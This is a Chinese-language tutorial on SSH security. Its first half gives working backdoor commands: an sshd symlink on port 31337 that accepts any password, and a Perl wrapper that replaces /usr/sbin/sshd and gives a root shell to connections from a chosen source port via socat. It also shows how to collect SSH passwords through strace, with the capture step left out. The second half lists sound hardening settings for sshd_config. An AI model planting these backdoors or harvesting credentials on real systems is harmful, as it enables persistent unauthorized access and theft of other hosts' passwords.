#### SSH 这个服务基本会出现在我们的 Linux 服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于 SSH 服务我们可能使用爆破攻击方式较多。默认端口：22

#### 

![](../Images/688da9fa40faf09a0b063dcff6a3cde7.png)SSH 漏洞利用

```
\# ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;
```

  

就会启动一个 31337 端口，然后连接 31337，用root/bin/ftp/mail 当用户名，密码 随意，就可登陆。

![](../Images/e0b4c1c3e1071ec9d8384b153e77f2e7.png)

做一个 SSH wrapper 后门，效果比第一个好，没有开放额外的端口，只要目标开了 SSH服务，就能远程连接

在目标机上执行如下代码：

\[root@localhost ~\]# cd /usr/sbi

\[root@localhost sbin\]# mv sshd ../bin

\[root@localhost sbin\]# echo '#!/usr/bin/perl' >sshd

\[root@localhost sbin\]# echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd

\[root@localhost sbin\]# echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd

\[root@localhost sbin\]# chmod u+x sshd

\[root@localhost sbin\]# /etc/init.d/sshd restart

在攻击机上执行如下代码：

socat STDIO TCP4:10.18.180.20:22,sourceport=13377

记录 SSH 客户端连接密码

搞定主机后，往往想记录目标机 SSH 连接到其他主机的密码，进一步扩大战果，使用 strace 命令就行了。

\[root@localhost ~\]# cd ..

\[root@localhost ~\]# cd tmp/

\[root@localhost tmp\]# ls

\[root@localhost tmp\]# grep "read(5" /tmp/.sshpwd-xxxxxxxxxxx.log |tail -n 11

![](../Images/688da9fa40faf09a0b063dcff6a3cde7.png)SSH 安全配置![](../Images/688da9fa40faf09a0b063dcff6a3cde7.png)1使用强密码

*   root 密码策略至少应该满足以下几点：
    
*   密码强度，至少是（字母大小写+数字+字符）一共 9 位以上
    
*   不同的系统密码不能一样
    
*   更换密码策略(每 90 天更换一次）
    
*   密码分发管理，管理不同业务服务器的系统管理员掌握不同的密码
    

2业务分离

##### 生产环境中,不同的业务可以做水平分离,比如把不同的服务运行到不同的服务器中,不需要远程访问的服务器可以绑定到 localhost( 比如只需要访问本机业务的数据库) 上。

3服务安全配置

##### openssh 目前额默认配置文件相比以前虽然要安全的多，但还是有必要对生产系统中的 ssh 服务器进行基线检查。

配置文件：/etc/ssh/ssh\_config

known\_hosts 保存相关服务器的签名，所以必须把主机名 hash：HashKnownHosts yes

SSH 协议 v1 不安全：Protocol 2

如果没用 X11 转发的情况：X11Forwarding no

关闭 rhosts：IgnoreRhosts yes

关闭允许空密码登陆：PermitEmptyPasswords no

最多登陆尝试次数：MaxAuthTries 5

禁止 root 登陆：PermitRootLogin no

关闭密码认证，启用公钥认证：

PubkeyAuthentication yes

PasswordAuthentication no

允许或者禁止用户/组登彔:

AllowGroups, AllowUsers, DenyUsers, DenyGroups

当然还有其他配置，如 ACL，防火墙，审计框架，及时打补丁等。
